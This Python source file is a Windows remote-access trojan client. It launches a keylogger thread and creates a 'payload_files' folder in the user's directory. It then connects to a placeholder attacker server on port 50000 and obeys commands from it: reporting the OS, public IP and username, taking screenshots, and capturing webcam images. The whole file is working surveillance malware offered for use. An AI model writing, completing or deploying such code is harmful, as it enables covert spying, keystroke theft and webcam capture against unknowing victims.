from threading import Thread
import keylogger_modul
import socket
import sys
import urllib.request
import os
import getpass
import pyautogui
from cv2 import *

pfad_to_payload_files='C:\\Users\\'+getpass.getuser()+'\\payload_files'
if not os.path.exists(pfad_to_payload_files):
    os.makedirs(pfad_to_payload_files)


# Keylogger
init_keylogger=keylogger_modul.keylogger_class()
thread_keylogger=Thread(target=init_keylogger.keylogger_funktion)
thread_keylogger.start()

# Shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("THE SERVER IP MUST BE HERE",50000))                               # You IP and Port!


try:
    while True:
        data = s.recv(1024)

        if data.decode().lower() == "exit client":              # exit
            raise ConnectionError("Client disconnected")

        elif data.decode().lower() == "show os":                # show os
            s.send(sys.platform.encode())
        
        elif data.decode().lower() == "show global ip":                 # show global ip
            try:
                global_ip = urllib.request.urlopen("https://api.ipify.org/")
                s.send(str(global_ip.readlines()).encode())
            except:
                s.send(b"this works not yet")

        elif data.decode().lower() == "show username":          # show username
            s.send(getpass.getuser().encode())
        
        elif data.decode().lower() == "make screenshot":        # make screenshot   # This is under development and is not yet finished!
            try:
                screen_shot = pyautogui.screenshot()
                screen_shot.save('C:\\Users\\'+getpass.getuser()+'\\payload_files'+"\\"+"screenshot.png", "PNG")
                s.send(b"screenshot was taken")
            except:
                s.send(b"this works not yet")

        elif data.decode().lower() == "make cam shot":          # make cam shot   # This is under development and is not yet finished!
            try:
                webcam = VideoCapture(0)
                for i in range(0, 5):
                    worked, img = webcam.read()
                    if worked:
                        imwrite('C:\\Users\\'+getpass.getuser()+'\\payload_files'+"\\"+"cam_shot.jpg", img)
                        webcam.release()
                        s.send(b"cam shot was taken")
            except:
                s.send(b"this works not yet")
        

        else:
            pass
finally:
    s.close()
